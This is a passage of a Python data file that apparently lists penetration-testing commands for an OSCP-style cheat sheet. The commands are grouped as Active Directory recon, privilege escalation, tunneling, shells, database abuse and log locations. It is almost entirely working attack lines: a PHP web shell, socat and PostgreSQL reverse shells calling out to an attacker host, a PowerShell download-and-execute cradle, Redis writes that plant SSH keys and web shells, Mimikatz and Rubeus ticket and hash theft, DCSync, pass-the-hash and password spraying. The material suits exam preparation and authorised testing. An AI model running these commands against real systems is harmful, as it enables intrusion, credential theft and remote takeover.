     "smbmap -H <IP> -u <USER> -p '<PASS>' --depth 5 -R <SHARE>",
     "recon", "smbmap,spider,recursive"),
    ("smbmap", "Download specific file from share",
     "smbmap -H <IP> -u <USER> -p '<PASS>' --download '<SHARE>/path/to/file.txt'",
     "recon", "smbmap,download,share"),
    ("smbmap", "Execute command via SMB",
     "smbmap -H <IP> -u <USER> -p '<PASS>' -x 'whoami'",
     "recon", "smbmap,exec,command"),
    # smbclient extras
    ("smbclient", "List shares with credentials",
     "smbclient -L //<IP>/ -U '<DOMAIN>/<USER>%<PASS>'",
     "recon", "smbclient,list,shares,auth"),
    ("smbclient", "Mass-download share contents (recursive get)",
     "smbclient //<IP>/<SHARE> -U '<USER>%<PASS>' -c 'prompt OFF; recurse ON; mget *'",
     "recon", "smbclient,mass,download,recurse"),
    # rpcclient
    ("rpcclient", "Null session connect",
     "rpcclient -U '' -N <IP>",
     "recon", "rpcclient,null,anonymous"),
    ("rpcclient", "Enum users via RPC",
     "rpcclient -U '<USER>%<PASS>' <IP> -c 'enumdomusers'",
     "recon", "rpcclient,users,enum"),
    ("rpcclient", "Enum groups via RPC",
     "rpcclient -U '<USER>%<PASS>' <IP> -c 'enumdomgroups'",
     "recon", "rpcclient,groups,enum"),
    ("rpcclient", "Query user by RID",
     "rpcclient -U '<USER>%<PASS>' <IP> -c 'queryuser <RID>'",
     "recon", "rpcclient,user,rid"),
    # ldapsearch extras
    ("ldapsearch", "Dump all user objects with key attributes",
     "ldapsearch -x -H ldap://<IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DOMAIN>,dc=<TLD>' '(objectClass=user)' sAMAccountName description memberOf",
     "recon", "ldap,users,enum,attrs"),
    ("ldapsearch", "Find Kerberoastable accounts via LDAP filter",
     "ldapsearch -x -H ldap://<IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DOMAIN>,dc=<TLD>' '(&(samAccountType=805306368)(servicePrincipalName=*))' sAMAccountName servicePrincipalName",
     "recon", "ldap,kerberoast,spn,filter"),
    ("ldapsearch", "Find ASREP-roastable accounts (DONT_REQ_PREAUTH)",
     "ldapsearch -x -H ldap://<IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DOMAIN>,dc=<TLD>' '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName",
     "recon", "ldap,asrep,preauth,filter"),
    ("ldapsearch", "Find domain admins group members",
     "ldapsearch -x -H ldap://<IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DOMAIN>,dc=<TLD>' '(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=<DOMAIN>,DC=<TLD>))' sAMAccountName",
     "recon", "ldap,da,domainadmins,members"),
    # PowerView
    ("powerview", "Import PowerView into current session",
     "powershell -ep bypass -c \"Import-Module .\\PowerView.ps1\"",
     "ad", "powerview,import,powershell"),
    ("powerview", "List all users in the domain",
     "Get-DomainUser | select samaccountname, description, memberof",
     "ad", "powerview,users,enum"),
    ("powerview", "Find Kerberoastable accounts",
     "Get-DomainUser -SPN | select samaccountname, serviceprincipalname",
     "ad", "powerview,kerberoast,spn"),
    ("powerview", "Find AS-REP roastable accounts",
     "Get-DomainUser -PreauthNotRequired | select samaccountname",
     "ad", "powerview,asrep,preauth"),
    ("powerview", "Find unconstrained delegation hosts",
     "Get-DomainComputer -Unconstrained | select dnshostname",
     "ad", "powerview,unconstrained,delegation"),
    ("powerview", "Get DACL on object (find ACL abuse paths)",
     "Get-DomainObjectAcl -Identity <TARGET> -ResolveGUIDs | ? {$_.IdentityReference -match '<USER>'}",
     "ad", "powerview,acl,dacl,abuse"),
    ("powerview", "Add user to group (if you have rights)",
     "Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'",
     "ad", "powerview,group,add"),
    ("powerview", "Set user password (if you have ForceChangePassword)",
     "$pw = ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force; Set-DomainUserPassword -Identity <TARGET> -AccountPassword $pw",
     "ad", "powerview,password,reset"),
    ("powerview", "Add SPN to user (targeted Kerberoast)",
     "Set-DomainObject -Identity <TARGET> -Set @{serviceprincipalname='fake/spn'}",
     "ad", "powerview,kerberoast,spn,targeted"),
    ("powerview", "Find ACEs writable to me on any object",
     "Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match $env:USERNAME}",
     "ad", "powerview,acl,writable,enum"),
    # PowerUp
    ("powerup", "Import PowerUp",
     "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1\"",
     "privesc-windows", "powerup,import,powershell"),
    ("powerup", "Run all privesc checks at once",
     "Invoke-AllChecks",
     "privesc-windows", "powerup,allchecks,privesc"),
    ("powerup", "Find services with modifiable binaries",
     "Get-ModifiableServiceFile",
     "privesc-windows", "powerup,service,modifiable"),
    ("powerup", "Find unquoted service paths",
     "Get-UnquotedService",
     "privesc-windows", "powerup,unquoted,service"),
    ("powerup", "Find AlwaysInstallElevated misconfig",
     "Get-RegistryAlwaysInstallElevated",
     "privesc-windows", "powerup,msi,elevated"),
    ("powerup", "Find autologon credentials in registry",
     "Get-RegistryAutoLogon",
     "privesc-windows", "powerup,autologon,registry"),
    # Chisel
    ("chisel", "Chisel server on Kali (reverse mode)",
     "./chisel server -p 8000 --reverse",
     "tunneling", "chisel,server,reverse"),
    ("chisel", "Chisel client on target (reverse SOCKS)",
     "./chisel.exe client <KALI_IP>:8000 R:1080:socks   # then proxychains nmap -sT -Pn <internal>",
     "tunneling", "chisel,client,socks,reverse"),
    ("chisel", "Chisel reverse port-forward single port",
     "./chisel.exe client <KALI_IP>:8000 R:<LOCAL_PORT>:<INTERNAL_IP>:<INTERNAL_PORT>",
     "tunneling", "chisel,client,reverse,forward"),
    ("chisel", "Configure proxychains to use chisel SOCKS",
     "# Edit /etc/proxychains4.conf - add: socks5 127.0.0.1 1080 (at bottom)",
     "tunneling", "chisel,proxychains,socks,config"),
    # SSH tunneling extras
    ("ssh", "Background SSH tunnel (no shell)",
     "ssh -fN -L <LPORT>:<TARGET>:<TPORT> <USER>@<JUMP>",
     "tunneling", "ssh,background,nohostspawn"),
    ("ssh", "SSH dynamic SOCKS + proxychains",
     "ssh -fN -D 1080 <USER>@<JUMP>  # then proxychains <cmd>",
     "tunneling", "ssh,socks,proxychains"),
    ("ssh", "SSH ProxyJump (chained pivot)",
     "ssh -J <USER1>@<JUMP1>,<USER2>@<JUMP2> <USER3>@<TARGET>",
     "tunneling", "ssh,proxyjump,chain"),
    ("ssh", "Reverse SSH from Linux target to Kali",
     "ssh -fN -R <KALI_PORT>:<INTERNAL_TARGET>:<INTERNAL_PORT> <KALI_USER>@<KALI>",
     "tunneling", "ssh,reverse,linux,pivot"),
    # plink
    ("plink", "plink reverse tunnel from Windows target",
     "plink.exe -ssh -l <KALI_USER> -pw <PASS> -R <KALI_PORT>:<INTERNAL>:<INTERNAL_PORT> <KALI_IP>",
     "tunneling", "plink,reverse,windows,pivot"),
    ("plink", "plink dynamic SOCKS proxy from Windows",
     "plink.exe -ssh -l <KALI_USER> -pw <PASS> -D 1080 <KALI_IP>",
     "tunneling", "plink,socks,windows,pivot"),
    # socat extras
    ("socat", "Fully interactive reverse shell from Linux target",
     "socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:<KALI>:<PORT>",
     "shells", "socat,reverse,interactive,linux"),
    ("socat", "Bind shell on target (listen for connection)",
     "socat TCP-LISTEN:<PORT>,fork EXEC:/bin/bash",
     "shells", "socat,bind,shell"),
    ("socat", "TCP port relay (basic pivot)",
     "socat TCP-LISTEN:<LPORT>,fork TCP:<TARGET>:<TPORT>",
     "tunneling", "socat,relay,pivot"),
    # Web extras
    ("wpscan", "Basic WordPress scan",
     "wpscan --url http://<IP>/ --enumerate u,p,t,vp",
     "web", "wpscan,wordpress,enum"),
    ("wpscan", "WPScan with API token (gets vuln data)",
     "wpscan --url http://<IP>/ --api-token <TOKEN> --enumerate vp,vt,u",
     "web", "wpscan,api,vuln"),
    ("wpscan", "WPScan brute force login",
     "wpscan --url http://<IP>/ -U users.txt -P /usr/share/wordlists/rockyou.txt",
     "web", "wpscan,brute,wordpress"),
    ("ffuf", "Fast directory bust with status filter",
     "ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,307,401,403 -recursion -recursion-depth 2",
     "web", "ffuf,dir,recursion,oscp"),
    # Password generation
    ("cewl", "Generate wordlist from website content",
     "cewl http://<IP>/ -d 3 -m 5 -w wordlist.txt",
     "passwords", "cewl,wordlist,generate"),
    ("crunch", "Generate wordlist with mask",
     "crunch 8 8 -t Password@%% -o wordlist.txt",
     "passwords", "crunch,mask,wordlist"),
    # Privesc extras
    ("pspy", "pspy64 with file/proc snapshot intervals",
     "./pspy64 -pf -i 1000",
     "privesc-linux", "pspy,monitor,linux"),
    ("linux-exploit-suggester", "Run linux-exploit-suggester for kernel exploits",
     "./linux-exploit-suggester.sh",
     "privesc-linux", "les,kernel,linux"),
    ("seatbelt", "Seatbelt for Windows situational awareness",
     ".\\Seatbelt.exe -group=all",
     "privesc-windows", "seatbelt,enum,windows"),
    ("accesschk", "Check writable services",
     ".\\accesschk.exe -uwcqv 'Authenticated Users' * /accepteula",
     "privesc-windows", "accesschk,services,writable"),
    # Misc OSCP practicalities
    ("misc", "Convert .ppk to OpenSSH",
     "puttygen <KEY>.ppk -O private-openssh -o id_rsa",
     "misc", "puttygen,ppk,ssh,convert"),
    ("misc", "Searchsploit search + copy locally",
     "searchsploit <KEYWORD> && searchsploit -m <EDB_ID>",
     "misc", "searchsploit,exploit,offline"),
    ("misc", "Searchsploit nmap XML import (auto-suggest)",
     "searchsploit --nmap nmap.xml",
     "misc", "searchsploit,nmap,auto"),
    # Shells
    ("shells", "Quick PHP web shell",
     "<?php system($_GET['cmd']); ?>",
     "shells", "php,webshell,cmd"),
    ("shells", "PowerShell direct in-memory IEX cradle",
     "powershell -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/script.ps1')\"",
     "shells", "powershell,iex,cradle,memory"),
    # evil-winrm extras
    ("evil-winrm", "Built-in upload (inside Evil-WinRM session)",
     "upload /local/file.exe C:\\Windows\\Temp\\file.exe",
     "shells", "evil-winrm,upload,transfer"),
    ("evil-winrm", "Built-in download (inside Evil-WinRM session)",
     "download C:\\Windows\\Temp\\loot.zip /tmp/loot.zip",
     "shells", "evil-winrm,download,transfer"),
    ("evil-winrm", "Built-in menu: Invoke-Binary, Bypass-4MSI, etc.",
     "menu",
     "shells", "evil-winrm,menu,amsi,bypass"),
]

# ─────────────────────────────────────────────
# NXC / BLOODYAD / RUBEUS / LIGOLO / MIMIKATZ
# (from add_oscp_commands.py)
# ─────────────────────────────────────────────
NXC_EXTRA = [
    ("nxc", "SMB auth check (Pwn3d! = local admin)",
     "nxc smb <IP> -u <USER> -p <PASS>",
     "ad", "nxc,smb,auth,enum"),
    ("nxc", "List SMB shares + READ/WRITE perms",
     "nxc smb <IP> -u <USER> -p <PASS> --shares",
     "ad", "nxc,smb,shares,enum"),
    ("nxc", "One-shot AD enum: users, password policy, shares",
     "nxc smb <IP> -u <USER> -p <PASS> --users --pass-pol --shares",
     "ad", "nxc,smb,enum,ad"),
    ("nxc", "Show logged-on users and active sessions",
     "nxc smb <IP> -u <USER> -p <PASS> --loggedon-users --sessions",
     "ad", "nxc,smb,sessions,enum"),
    ("nxc", "RID brute force via SAMR",
     "nxc smb <IP> -u <USER> -p <PASS> --rid-brute",
     "ad", "nxc,smb,rid,brute"),
    ("nxc", "Pass-the-Hash SMB auth check",
     "nxc smb <IP> -u <USER> -H <NTHASH>",
     "ad", "nxc,smb,pth,hash"),
    ("nxc", "Dump local SAM hashes + LSA secrets (needs local admin)",
     "nxc smb <IP> -u <USER> -p <PASS> --sam --lsa",
     "ad", "nxc,smb,sam,lsa,dump"),
    ("nxc", "DCSync NTDS.dit via DRSUAPI (needs DA or repl rights)",
     "nxc smb <IP> -u <USER> -p <PASS> --ntds",
     "ad", "nxc,smb,ntds,dcsync,dump"),
    ("nxc", "Remote command exec (default smbexec)",
     "nxc smb <IP> -u <USER> -p <PASS> -x 'whoami'",
     "ad", "nxc,smb,exec,shell"),
    ("nxc", "Password spray: one password vs many users",
     "nxc smb <IP> -u users.txt -p '<PASS>' --continue-on-success",
     "ad", "nxc,smb,spray,password"),
    ("nxc", "Dump LSASS via SMB module",
     "nxc smb <IP> -u <USER> -p <PASS> -M lsassy",
     "ad", "nxc,smb,lsassy,lsass,module"),
    ("nxc", "AS-REP roast (hashcat 18200)",
     "nxc ldap <IP> -u <USER> -p <PASS> --asreproast asrep.txt",
     "ad", "nxc,ldap,asrep,roast,kerberos"),
    ("nxc", "Kerberoast (SPN accounts; hashcat 13100)",
     "nxc ldap <IP> -u <USER> -p <PASS> --kerberoasting kerb.txt",
     "ad", "nxc,ldap,kerberoast,spn"),
    ("nxc", "BloodHound collection via LDAP",
     "nxc ldap <IP> -u <USER> -p <PASS> --bloodhound --collection All --dns-server <IP>",
     "ad", "nxc,ldap,bloodhound,collect"),
    ("nxc", "WinRM auth check (Pwn3d! = Remote Mgmt Users)",
     "nxc winrm <IP> -u <USER> -p <PASS>",
     "ad", "nxc,winrm,auth"),
    ("nxc", "Check CVE-2020-1472 Zerologon",
     "nxc smb <IP> -u <USER> -p <PASS> -M zerologon",
     "ad", "nxc,zerologon,cve,module"),
    ("nxc", "List ADCS templates (ESC1-ESC8 misconfigs)",
     "nxc ldap <IP> -u <USER> -p <PASS> -M adcs",
     "ad", "nxc,ldap,adcs,esc,module"),
    ("bloodyAD", "Show every object + attribute user can write",
     "bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p <PASS> get writable --detail",
     "ad", "bloodyad,writable,acl,enum"),
    ("bloodyAD", "Write an attribute on an AD object",
     "bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p <PASS> set object <TARGET> <ATTR> -v <VALUE>",
     "ad", "bloodyad,write,attribute"),
    ("bloodyAD", "RBCD: allow attacker$ to delegate to target$",
     "bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p <PASS> add rbcd <TARGET>$ <ATTACKER>$",
     "ad", "bloodyad,rbcd,delegation"),
    ("bloodyAD", "Targeted Kerberoast: add SPN to a user account",
     "bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p <PASS> set object <TARGET> servicePrincipalName -v 'fake/spn'",
     "ad", "bloodyad,kerberoast,spn,targeted"),
    ("bloodyAD", "Shadow Credentials via msDS-KeyCredentialLink",
     "bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p <PASS> add shadowCredentials <TARGET>",
     "ad", "bloodyad,shadow,credentials,pkinit"),
    ("bloodyAD", "bloodyAD via Pass-the-Hash",
     "bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p ':<NTHASH>' get writable",
     "ad", "bloodyad,pth,hash"),
    ("impacket", "Create machine account (for RBCD)",
     "impacket-addcomputer -computer-name 'PWNED$' -computer-pass 'P@ss123!' -dc-ip <DC_IP> -domain-netbios <NETBIOS> <DOMAIN>/<USER>:'<PASS>'",
     "impacket", "impacket,addcomputer,rbcd,machine"),
    ("impacket", "S4U2self+S4U2proxy (RBCD final step)",
     "impacket-getST -spn 'cifs/<TARGET>' -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/<MACHINE>$:<PASS>'",
     "impacket", "impacket,getst,s4u,rbcd,kerberos"),
    ("impacket", "Load ccache for Kerberos auth (set env var)",
     "export KRB5CCNAME=$(pwd)/ticket.ccache; klist",
     "impacket", "impacket,kerberos,ccache,env"),
    ("impacket", "DCSync a single user's hash (fast, less noisy)",
     "impacket-secretsdump <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc-user <TARGET>",
     "impacket", "impacket,secretsdump,dcsync,user"),
    ("impacket", "Offline NTDS parse (after ntdsutil IFM dump)",
     "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL",
     "impacket", "impacket,secretsdump,offline,ntds"),
    ("impacket", "PsExec via Pass-the-Hash (SYSTEM shell)",
     "impacket-psexec -hashes :<NTHASH> <DOMAIN>/Administrator@<IP>",
     "impacket", "impacket,psexec,pth,system"),
    # Ligolo
    ("ligolo", "Create the ligolo tun interface on Kali",
     "sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up",
     "tunneling", "ligolo,tun,interface,setup"),
    ("ligolo", "Start ligolo-ng proxy (listens 0.0.0.0:11601)",
     "./proxy -selfcert",
     "tunneling", "ligolo,proxy,server,setup"),
    ("ligolo", "Run agent on compromised Windows host",
     ".\\agent.exe -connect <KALI_IP>:11601 -ignore-cert",
     "tunneling", "ligolo,agent,windows"),
    ("ligolo", "Route Kali traffic into internal subnet through tunnel",
     "sudo ip route add <INTERNAL_SUBNET>/24 dev ligolo",
     "tunneling", "ligolo,route,subnet"),
    ("ligolo", "In ligolo prompt: select agent then start tunnel",
     "session  # then: start --tun ligolo",
     "tunneling", "ligolo,session,start"),
    ("ligolo", "Reverse port-forward: expose Kali svc into internal net",
     "listener_add --addr 0.0.0.0:<PORT> --to 127.0.0.1:<PORT>",
     "tunneling", "ligolo,listener,reverse,forward"),
    # Mimikatz extras
    ("mimikatz", "Dump NT hashes for all accounts via Samsrv patch",
     "mimikatz.exe \"privilege::debug\" \"lsadump::lsa /patch\" \"exit\"",
     "privesc-windows", "mimikatz,lsa,patch,dump"),
    ("mimikatz", "Dump MS Cache v2 (DCC2) hashes - hashcat 2100",
     "mimikatz.exe \"privilege::debug\" \"lsadump::cache\" \"exit\"",
     "privesc-windows", "mimikatz,cache,dcc2,hashcat"),
    ("mimikatz", "Export all Kerberos tickets from LSASS to .kirbi",
     "mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" \"exit\"",
     "privesc-windows", "mimikatz,tickets,export,kerberos"),
    ("mimikatz", "Pass-the-Ticket: inject .kirbi into session",
     "mimikatz.exe \"kerberos::ptt <TICKET.kirbi>\"",
     "privesc-windows", "mimikatz,ptt,kerberos,ticket"),
    # Rubeus
    ("Rubeus", "Request TGT (no inject, print base64)",
     "Rubeus.exe asktgt /user:<USER> /password:<PASS> /domain:<FQDN> /dc:<DC_FQDN> /nowrap",
     "ad", "rubeus,asktgt,kerberos"),
    ("Rubeus", "Overpass-the-Hash: TGT from NT hash",
     "Rubeus.exe asktgt /user:<USER> /rc4:<NTHASH> /domain:<FQDN> /nowrap",
     "ad", "rubeus,overpass,pth,kerberos"),
    ("Rubeus", "S4U constrained delegation abuse + inject",
     "Rubeus.exe s4u /ticket:<BASE64> /impersonateuser:Administrator /msdsspn:cifs/<TARGET> /ptt",
     "ad", "rubeus,s4u,delegation,kerberos"),
    ("Rubeus", "Kerberoast all SPN accounts to file (hashcat 13100)",
     "Rubeus.exe kerberoast /outfile:kerb.txt /nowrap",
     "ad", "rubeus,kerberoast,spn"),
    ("Rubeus", "AS-REP roast hashcat format",
     "Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat",
     "ad", "rubeus,asrep,roast,hashcat"),
    ("Rubeus", "Inject .kirbi ticket into current session",
     "Rubeus.exe ptt /ticket:<FILE.kirbi>",
     "ad", "rubeus,ptt,inject,ticket"),
    # Clock/misc
    ("rdate", "Sync Kali clock to DC (fixes KRB_AP_ERR_SKEW)",
     "sudo rdate -n <DC_IP>",
     "misc", "rdate,kerberos,clock,skew"),
    ("python", "Compute NT hash from cleartext (offline)",
     "python3 -c \"import hashlib; print(hashlib.new('md4', '<PASS>'.encode('utf-16le')).hexdigest())\"",
     "misc", "python,nthash,ntlm,hash"),
    ("faketime", "Run a single command with faked time offset",
     "faketime '+8h' <IMPACKET_COMMAND>",
     "misc", "faketime,clock,kerberos"),
]

# ─────────────────────────────────────────────
# DATABASES (from add_db_and_logs.py)
# ─────────────────────────────────────────────
DATABASES = [
    ("mysql", "Connect as root locally", "mysql -u root -p", "databases", "mysql,connect,local,root"),
    ("mysql", "Connect to remote MySQL with credentials", "mysql -h <IP> -u <USER> -p'<PASS>' -P 3306", "databases", "mysql,connect,remote,auth"),
    ("mysql", "Connect without password (misconfigured servers)", "mysql -h <IP> -u root --skip-password", "databases", "mysql,connect,noauth,anonymous"),
    ("mysql", "List all databases", "SHOW DATABASES;", "databases", "mysql,enum,databases,list"),
    ("mysql", "Select database and list tables", "USE <DATABASE>; SHOW TABLES;", "databases", "mysql,enum,tables,list"),
    ("mysql", "Dump all MySQL users and password hashes", "SELECT user, host, authentication_string FROM mysql.user;", "databases", "mysql,users,hashes,dump,creds"),
    ("mysql", "Read file from disk via MySQL (needs FILE priv)", "SELECT LOAD_FILE('/etc/passwd');", "databases", "mysql,file,read,lfi,privesc"),
    ("mysql", "Write webshell via MySQL INTO OUTFILE", "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';", "databases", "mysql,outfile,webshell,write,rce"),
    ("mysql", "Check secure_file_priv (NULL = unrestricted write)", "SHOW VARIABLES LIKE 'secure_file_priv';", "databases", "mysql,secure,file,priv,check"),
    ("mysql", "Find tables containing 'user' or 'password' keywords", "SELECT table_schema, table_name FROM information_schema.tables WHERE table_name LIKE '%user%' OR table_name LIKE '%pass%' OR table_name LIKE '%admin%';", "databases", "mysql,search,tables,creds,enum"),
    ("mysql", "Find columns named password/hash across all DBs", "SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%' OR column_name LIKE '%hash%' OR column_name LIKE '%secret%' OR column_name LIKE '%token%';", "databases", "mysql,search,columns,creds,enum"),
    ("mysql", "One-liner dump all tables in a database (bash)", "mysqldump -h <IP> -u <USER> -p'<PASS>' <DATABASE> > dump.sql", "databases", "mysql,dump,mysqldump,export"),
    ("psql", "Connect to remote PostgreSQL", "psql -h <IP> -U <USER> -d <DATABASE> -p 5432", "databases", "psql,postgresql,connect,remote"),
    ("psql", "Connect as postgres user locally", "psql -U postgres", "databases", "psql,postgresql,local,postgres"),
    ("psql", "List all databases (inside psql)", "\\l", "databases", "psql,postgresql,list,databases"),
    ("psql", "Dump all PostgreSQL users and password hashes", "SELECT usename, passwd FROM pg_shadow;", "databases", "psql,postgresql,users,hashes,dump,creds"),
    ("psql", "RCE via COPY TO PROGRAM (PostgreSQL 9.3+)", "COPY cmd_exec FROM PROGRAM 'id';", "databases", "psql,postgresql,rce,program,copy,privesc"),
    ("psql", "Enable COPY FROM PROGRAM (full RCE)", "CREATE TABLE cmd_exec(cmd_output TEXT); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;", "databases", "psql,postgresql,rce,command,exec,privesc"),
    ("psql", "Reverse shell via COPY FROM PROGRAM", "COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1\"';", "databases", "psql,postgresql,rce,reverse,shell,privesc"),
    ("psql", "Read file via COPY command (needs superuser)", "CREATE TABLE tmp(data TEXT); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;", "databases", "psql,postgresql,file,read,copy,privesc"),
    ("mssql", "Connect via impacket-mssqlclient (Windows auth)", "impacket-mssqlclient <DOMAIN>/<USER>:'<PASS>'@<IP> -windows-auth", "databases", "mssql,impacket,connect,windows,auth"),
    ("mssql", "Enable xp_cmdshell (requires sysadmin)", "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", "databases", "mssql,xpcmdshell,enable,rce,privesc"),
    ("mssql", "Execute OS command via xp_cmdshell", "EXEC xp_cmdshell 'whoami'; GO", "databases", "mssql,xpcmdshell,rce,exec,command"),
    ("mssql", "Check if current user is sysadmin", "SELECT IS_SRVROLEMEMBER('sysadmin'); GO", "databases", "mssql,sysadmin,check,privesc"),
    ("mssql", "Linked server enumeration (pivot path)", "SELECT name FROM sys.servers; EXEC sp_linkedservers; GO", "databases", "mssql,linked,servers,enum,pivot"),
    ("mssql", "Execute command on linked server", "EXEC ('xp_cmdshell ''whoami''') AT [<LINKED_SERVER>]; GO", "databases", "mssql,linked,server,rce,pivot"),
    ("mssql", "Impersonate another SQL login (if IMPERSONATE granted)", "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; GO", "databases", "mssql,impersonate,login,privesc"),
    ("sqlite3", "Find SQLite databases on disk", "find / -name '*.sqlite' -o -name '*.sqlite3' -o -name '*.db' 2>/dev/null", "databases", "sqlite,find,databases,disk"),
    ("sqlite3", "Open SQLite database file", "sqlite3 <FILE>.db", "databases", "sqlite,open,connect"),
    ("sqlite3", "List all tables", ".tables", "databases", "sqlite,list,tables"),
    ("sqlite3", "Dump all rows from a table", "SELECT * FROM <TABLE>;", "databases", "sqlite,dump,select,table"),
    ("sqlite3", "One-liner: extract users from common app DBs", "sqlite3 <FILE>.db 'SELECT * FROM users;'", "databases", "sqlite,oneliner,users,creds"),
    ("redis", "Connect to Redis (unauthenticated)", "redis-cli -h <IP> -p 6379", "databases", "redis,connect,unauthenticated"),
    ("redis", "List all keys", "KEYS *", "databases", "redis,keys,list,enum"),
    ("redis", "Get Redis server info", "INFO server", "databases", "redis,info,server,enum"),
    ("redis", "Write SSH key to authorized_keys via Redis", "CONFIG SET dir /root/.ssh/\nCONFIG SET dbfilename authorized_keys\nSET pwn \"\\n\\n<YOUR_PUBKEY>\\n\\n\"\nSAVE", "databases", "redis,ssh,authorized,keys,rce,privesc"),
    ("redis", "Write PHP webshell via Redis (if web dir writable)", "CONFIG SET dir /var/www/html/\nCONFIG SET dbfilename shell.php\nSET pwn '<?php system($_GET[\"cmd\"]); ?>'\nSAVE", "databases", "redis,webshell,php,write,rce"),
    ("mongo", "Connect to MongoDB (unauthenticated)", "mongosh <IP>:27017", "databases", "mongo,mongodb,connect,unauthenticated"),
    ("mongo", "List all databases", "show dbs", "databases", "mongo,mongodb,list,databases"),
    ("mongo", "Dump all documents from a collection", "db.<COLLECTION>.find().pretty()", "databases", "mongo,mongodb,dump,find,documents"),
    ("mongo", "List all users", "use admin; db.system.users.find().pretty()", "databases", "mongo,mongodb,users,list,enum"),
]

# ─────────────────────────────────────────────
# LOGS (from add_db_and_logs.py)
# ─────────────────────────────────────────────
LOGS = [
    ("logs", "Windows Security Event Log (logons 4624/4625, privesc 4672)", "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx", "logs", "logs,windows,security,evtx,logon,windows-logs"),
    ("logs", "PowerShell Operational Log (commands run)", "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx", "logs", "logs,windows,powershell,operational,evtx,windows-logs"),
    ("logs", "Windows Firewall Log (dropped/allowed packets)", "C:\\Windows\\System32\\LogFiles\\Firewall\\pfirewall.log", "logs", "logs,windows,firewall,network,pfirewall,windows-logs"),
    ("logs", "IIS Default Access Log Location", "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex<YYMMDD>.log", "logs", "logs,windows,iis,web,access,w3c,iis-logs,windows-logs"),
    ("logs", "IIS Log — find URLs with passwords/tokens in query string", "findstr /si \"password\\|pass=\\|token=\\|key=\\|secret=\" C:\\inetpub\\logs\\LogFiles\\W3SVC1\\*.log", "logs", "logs,windows,iis,grep,password,creds,iis-logs,windows-logs"),
    ("logs", "RDP TerminalServices-LocalSessionManager (successful RDP logons)", "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx", "logs", "logs,windows,rdp,terminal,services,session,rdp-logs,windows-logs"),
    ("logs", "MSSQL Error Log (contains login failures + connection strings)", "C:\\Program Files\\Microsoft SQL Server\\MSSQL<VER>.MSSQLSERVER\\MSSQL\\Log\\ERRORLOG", "logs", "logs,windows,mssql,sql,error,mssql-logs,windows-logs"),
    ("logs", "PowerShell: grep all Windows evtx logs for keywords", "Get-WinEvent -Path 'C:\\Windows\\System32\\winevt\\Logs\\Security.evtx' | Where-Object {$_.Message -match 'password|credential|secret'} | Select TimeCreated,Message", "logs", "logs,windows,grep,powershell,keyword,search,windows-logs"),
    ("logs", "Linux auth log (SSH logons, sudo, su)", "/var/log/auth.log  (Debian/Ubuntu) | /var/log/secure  (CentOS/RHEL)", "logs", "logs,linux,auth,ssh,sudo,su,linux-logs"),
    ("logs", "Linux syslog (general system events)", "/var/log/syslog  (Debian) | /var/log/messages  (RHEL)", "logs", "logs,linux,syslog,messages,system,linux-logs"),
    ("logs", "Bash: grep auth.log for accepted SSH keys", "grep -i 'accepted\\|publickey\\|password' /var/log/auth.log", "logs", "logs,linux,auth,ssh,grep,key,linux-logs"),
    ("logs", "Bash: grep auth.log for failed logins + usernames", "grep -i 'failed\\|invalid user\\|authentication failure' /var/log/auth.log | grep -oP 'user \\K\\S+'", "logs", "logs,linux,auth,failed,users,grep,linux-logs"),
    ("logs", "Apache access log (GET/POST params may contain creds)", "/var/log/apache2/access.log  (Debian) | /var/log/httpd/access_log  (RHEL)", "logs", "logs,linux,apache,web,access,apache-logs,linux-logs"),
    ("logs", "Apache error log (stack traces, paths, misconfigs)", "/var/log/apache2/error.log  (Debian) | /var/log/httpd/error_log  (RHEL)", "logs", "logs,linux,apache,web,error,apache-logs,linux-logs"),
    ("logs", "Apache: grep access log for passwords in URLs", "grep -E 'pass=|password=|passwd=|token=|secret=|key=' /var/log/apache2/access.log", "logs", "logs,linux,apache,grep,creds,urls,apache-logs,linux-logs"),
    ("logs", "Nginx access log", "/var/log/nginx/access.log", "logs", "logs,linux,nginx,web,access,nginx-logs,linux-logs"),
    ("logs", "Nginx error log", "/var/log/nginx/error.log", "logs", "logs,linux,nginx,web,error,nginx-logs,linux-logs"),
